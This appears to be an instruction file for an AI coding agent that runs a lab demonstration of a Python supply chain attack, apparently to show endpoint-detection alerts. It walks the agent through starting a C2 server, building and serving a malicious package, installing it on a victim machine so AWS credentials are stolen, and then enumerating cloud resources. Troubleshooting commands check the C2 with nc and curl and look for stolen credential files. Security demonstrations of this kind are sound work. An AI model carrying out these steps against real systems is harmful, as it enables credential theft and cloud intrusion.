# Warp Agent Instructions - Supply Chain Attack Demo

This project demonstrates a supply chain attack: malicious package → credential theft → cloud enumeration.

## Agent Execution Context

When a user asks you to help with this demo, follow the step-by-step execution based on which machine they're on:

### Machine Detection
First, identify which lab machine the user is on:
- **C2 Server** (Fake WAN) - Attacker infrastructure
- **Victim Endpoint** - Developer machine with Cortex XDR
- **Build Machine** - For packaging the project

### Execution Flows

#### On Build Machine (packaging for lab transfer)
```bash
cd /Users/mabutbul/python-pack
tar -czf python-pack-demo.tar.gz \
  README.md EXECUTION_GUIDE.md QUICK_START_CHECKLIST.md WARP.md \
  1-attacker-infrastructure/ 2-malicious-package/ \
  3-victim-application/ 4-attacker-operations/ 5-aws-infrastructure/
```

#### On C2 Server
**Step 1 - Extract and Start C2:**
```bash
cd ~ && tar -xzf python-pack-demo.tar.gz
cd python-pack/1-attacker-infrastructure
sudo ./start_infrastructure.sh  # Keep running, note the IP
```

**Step 2 - Build Package (new terminal):**
```bash
cd ~/python-pack/2-malicious-package
./build_and_upload.sh <C2_IP>
```

**Step 3 - Setup AWS (new terminal, if needed):**
```bash
cd ~/python-pack/5-aws-infrastructure
./setup_aws.sh
```

**Step 4 - Execute Cloud Attack (after victim installs package):**
```bash
cd ~/python-pack/4-attacker-operations
./run_attack.sh
```

#### On Victim Endpoint
**Step 1 - Extract and Setup:**
```bash
cd ~ && tar -xzf python-pack-demo.tar.gz
cd python-pack
mkdir -p ~/.aws
cp 5-aws-infrastructure/demo_aws_credentials ~/.aws/credentials
```

**Step 2 - Configure to use attacker PyPI:**
```bash
cd 3-victim-application
./setup_victim.sh <C2_IP>
```

**Step 3 - Trigger Attack:**
```bash
cd ~/python-pack/3-victim-application
export PIP_CONFIG_FILE=$(pwd)/.pip/pip.conf
pip install -r requirements.txt
```

**Step 4 - Optional Runtime Test:**
```bash
python3 app.py
```

### Key Variables to Ask User
- **C2_IP**: The IP address of the C2 server (attacker infrastructure)
- **Current Machine**: Which lab machine are they on?

### Important Notes for Agent
1. **Always ask** for the C2 IP before running build or victim setup scripts
2. **Check** if C2 server is already running before starting it
3. **Verify** AWS credentials file exists before victim setup
4. **Monitor** XDR alerts at each phase when on victim machine
5. **Keep C2 server running** - it needs to stay open to receive credentials

### Success Indicators to Verify
- C2 server shows "Credentials stolen" message
- AWS enumeration script completes without errors
- User can see Cortex XDR alerts in their console

### Troubleshooting Commands
```bash
# Check if C2 server is running
ps aux | grep c2_server

# Verify PyPI server is accessible
curl http://<C2_IP>/simple/

# Check if credentials were stolen
ls -la ~/python-pack/1-attacker-infrastructure/stolen_*

# Test network connectivity
ping <C2_IP>
nc -zv <C2_IP> 443
nc -zv <C2_IP> 80
```

### Quick Cleanup Commands
```bash
# Victim cleanup
pip uninstall aws-data-utils -y
rm -rf ~/python-pack

# C2 cleanup
pkill -f c2_server.py
cd ~/python-pack/1-attacker-infrastructure && rm -f stolen_*
```

## Agent Behavior Guidelines
- Ask which machine the user is on before starting
- Request the C2 IP address if it's needed for the current step
- Explain what each script does before running it
- Provide real-time status updates during execution
- Alert user to check Cortex XDR console at key moments
- Use the detailed EXECUTION_GUIDE.md if user needs more context
